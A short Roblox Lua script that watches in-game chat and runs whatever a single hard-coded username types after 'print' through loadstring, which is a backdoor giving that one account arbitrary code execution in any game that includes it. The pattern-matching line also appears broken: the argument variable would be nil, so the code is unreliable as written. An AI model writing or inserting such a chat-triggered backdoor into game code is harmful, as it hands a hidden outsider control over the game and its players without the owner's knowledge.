print('new')

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Listen for chat messages
Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        -- Check if the player is "butwhychewbut"
        if player.Name == "butwhychewbut" then
            -- Parse the message for the "print" command
            local command, argument = message:match("^print%s*(.*)$")
            if command then
                -- Execute the "print" command
                local success, result = pcall(loadstring("return " .. argument))
                if success then
                    print(result)
                else
                    warn("Error executing command:", result)
                end
            end
        end
    end)
end)
